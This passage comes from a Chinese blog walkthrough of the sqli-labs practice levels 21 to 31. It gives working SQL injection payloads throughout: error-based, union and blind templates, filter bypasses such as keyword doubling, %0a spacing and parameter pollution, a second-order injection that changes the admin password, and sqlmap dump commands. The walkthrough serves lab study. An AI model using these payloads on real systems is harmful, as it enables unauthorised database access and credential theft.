4# YWRtaW4nIGFuZCAxPTEgb3JkZXIgYnkgNCM= 看回显闭合方式是')\n报错注入\n1 2 3 4 admin\u0026#39;) and updatexml(1,concat(0x7e,(select database()),0x7e),1)# base64加密 YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBkYXRhYmFzZSgpKSwweDdl KSwxKSM= 后面跟前面一样爆破\nsqlmap进行加密注入 对进行加密注入的数据需要用到tamper模块\n1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; --current-db 1 python sqlmap.py -r C:\\Users\\10086\\Desktop\\1.txt --batch --level=2 --tamper=\u0026#34;base64encode.py\u0026#34; -D security -T users --dump less22 闭合方式改为\u0026rsquo;\u0026rsquo;,其他跟less21一样\nless23 字符型注入但是注释符被过滤了\n#和\u0026ndash;+都被替换成空字符\n只有想方法将闭合符号消耗完毕，让后台能够接收，处理掉原有的闭合方式\n1 2 3 id=-1\u0026#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) and \u0026#39;1\u0026#39;=\u0026#39;1 这样构造闭合的目的就是将原有单引号进行逃逸使查询语句变为 id=\u0026#39;-1\u0026#39; xxx and \u0026#39;1\u0026#39;=\u0026#39;1\u0026#39; 最后的半个 单引号用于逃逸后台的闭合方式 sqlmap运用 1 python sqlmap.py -u http://127.0.0.1/sqli-labs/sqli-labs/Less-23/?id=1 --batch -D security -T users --dump 无脑梭\nless24 二次注入 二次注入是存储型注入，可以理解为构造恶意数据存储在数据库后，恶意数据被读取并进入\n到了SQL查询语句所导致的注入。恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，\n当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。简言之就是将\n脏数据进行简单过滤后开发者就认为该数据可信便存入数据库中，当下一次调用该数据时，该数据就会\n拼接到其他查询语句中造成注入。\n注册新账号，并登入\n修改密码,修改功能语句为\n1 UPDATE users SET passwd=\u0026#34;New_Pass\u0026#34; WHERE users=\u0026#39;admin\u0026#39; 因为\u0026rsquo;和后面的引号闭合，而#又把语句注释了，所以在这里修改密码就相当于在修改admin的密码，这时候我们就是在进行越权改变管理员的密码，从数据库中抽出我们注册的新账户，用该账户越权修改\n管理员的密码\n修改为1234\n登入admin账号\nless25 and和or都被过滤了\n解决思路将or变成oorr,这样后台过滤了or还剩下or或者用||代替or(and一样的方式)\n1 2 3 4 爆破数据库名 ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 或者 ?id=-1\u0026#39; || updatexml(1,concat(0x7e,(select database()),0x7e),1)--+ 1 2 3 4 爆破数据表 ?id=-1\u0026#39; oorr updatexml(1,concat(0x7e,(select group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() ),0x7e),1)--+ 注意：information中也有or需要进行双写 后面都一样\nless25a 发现与Less25的区别是数字型注入\n联合注入\n1 2 3 4 5 6 7 8 9 查询数据表 ?id=-1 union select 1,database(),group_concat(table_name)from infoorrmation_schema.tables where table_schema=database() --+ 查询字段名 ?id=-1 union select 1,database(),group_concat(column_name)from infoorrmation_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 查users id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd))from security.users--+ less26 发现and，空格，注释都没有了\n\\s过滤了空格和换行，解决and or可以双写或者用\u0026amp;\u0026amp;和||代替，解决注释需要强行\n闭合逃逸，需要空格的地方可以加上括号，白盒测试发现注入类型为字符型\n1 2 3 and or ——\u0026gt; \u0026amp;\u0026amp; || # -- ——\u0026gt; 闭合逃逸 /s ——\u0026gt; 括号 1 2 3 4 5 6 7 8 9 10 11 12 13 14 payload ?id=-1\u0026#39;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破数据表 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_sc hema=database())),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破字段名 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_ name=\u0026#39;users\u0026#39;)),0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 爆破字段内容 ?id=-1\u0026#39;||updatexml(1,concat(0x7e, (select(group_concat(concat_ws(username,0x3a,passwoorrd)))from(security.users)), 0x7e),1)||\u0026#39;1\u0026#39;=\u0026#39;1 less26a less26a过滤的东西与less26一致，通过测试发现闭合方式还是为单引号,并且没有报错的回显\n尝试盲注\n通过布尔盲注可以逐一猜解爆破\n盲注的板子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 盲注 ?id=1\u0026#39;and length((select database()))\u0026gt;9--+ #大于号可以换成小于号或者等于号，主要是判断数据库的长度。lenfth()是获取当前数据库名的长度。如果数据库是haha那么length()就是4 ?id=1\u0026#39;and ascii(substr((select database()),1,1))=115--+ #substr(\u0026#34;78909\u0026#34;,1,1)=7 substr(a,b,c)a是要截取的字符串，b是截取的位置，c是截取的长度。布尔盲注我们都是长度为1因为我们要一个个判断字符。ascii()是将截取的字符转换成对应的ascii吗，这样我们可以很好确定数字根据数字找到对应的字符。 ?id=1\u0026#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13--+ 判断所有表名字符长度。 ?id=1\u0026#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99--+ 逐一判断表名 ?id=1\u0026#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20--+ 判断所有字段名的长度 ?id=1\u0026#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99--+ 逐一判断字段名。 ?id=1\u0026#39; and length((select group_concat(username,password) from users))\u0026gt;109--+ 判断字段内容长度 ?id=1\u0026#39; and ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50--+ 逐一检测内容。 时间盲注9 ?id=1\u0026#39; and if(1=1,sleep(5),1)--+ 判断参数构造。 ?id=1\u0026#39;and if(length((select database()))\u0026gt;9,sleep(5),1)--+ 判断数据库名长度 ?id=1\u0026#39;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+ 逐一判断数据库字符 ?id=1\u0026#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))\u0026gt;13,sleep(5),1)--+ 判断所有表名长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断表名 ?id=1\u0026#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;))\u0026gt;20,sleep(5),1)--+ 判断所有字段名的长度 ?id=1\u0026#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;),1,1))\u0026gt;99,sleep(5),1)--+ 逐一判断字段名。 ?id=1\u0026#39; and if(length((select group_concat(username,password) from users))\u0026gt;109,sleep(5),1)--+ 判断字段内容长度 ?id=1\u0026#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))\u0026gt;50,sleep(5),1)--+ 逐一检测内容。 less27 直接看源码\nselect,union这类关键词只过滤完全大写或者完全小写，针对php这种弱类型语言，可以采用部分大写\n部分小写绕过\n1 空格，换行——\u0026gt; %0a payload\n1 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,database(),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 1 2 爆破数据表 ?id=1\u0026#39;and%0aupdatexml(1,concat(0x7e,(selEct%0atable_name%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()%0alimit%0a1,1),0x7e),1)or\u0026#39;1\u0026#39;=\u0026#39;1 重写绕过\n1 2 3 4 5 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(table_name))from(information_schema.tables)where(table_schema=\u0026#39;security\u0026#39;))),1))or\u0026#39;0 爆表 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(column_name))from(information_schema.columns)where(table_schema=\u0026#39;security\u0026#39;and(table_name=\u0026#39;users\u0026#39;)))),1))or\u0026#39;0 爆字段 ?id=1\u0026#39;or(updatexml(1,concat(0x7e,(selselecselecttect(group_concat(password,username))from(users))),1))or\u0026#39;0 爆密码账户 less27a 闭合方式改为\u0026quot;,其他和less27一样\nless28 查看源码\nunion select被匹配了，解决的办法就是绕过union select 即可，测试发现没有报错回显，闭合方式为')\n盲注\npayload(x是要猜的值)\n1 ?id=1\u0026#39;)and(length(database()))=x%0aand(\u0026#39;1\u0026#39;)=(\u0026#39;1 less28a 通过源码发现仅仅匹配了union select组合，其余都未匹配，与Less28一样，用盲注的方式\npayload\n1 ?id=1\u0026#39;) and length(database())=8--+ less29 HTTP参数污染\n1 2 3 4 服务器端有两个部分：第一部分是tomcat为引擎的jsp型服务器，第二部分是apache为引擎的php服务 器，真正提供web服务的是php服务器，往往在tomcat的服务器处做过滤处理，功能类似于waf，由于 解析参数的机制不同，我们可以利用该原理绕过waf的检测；数据解析的顺序：tomcat从前往后， apache从后往前。 此关的通关简单联合查询即可，目的是了解参数污染的原理\npayload\n1 2 ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=\u0026#39;users\u0026#39;)--+ ?id=1\u0026amp;id=0\u0026#39; union select 1,2,(select concat_ws(username,0x7e,password)from security.users limit 0,1)--+ less30 与Less29的区别为闭合方式为双引号\nless31 与Less29的区别为闭合方式为双引号加括号\nless32 ","date":"2024-09-07T00:00:00Z","image":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/1.png","permalink":"https://0d000721999.github.io/p/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/","title":"sqli-labs靶场练习"}]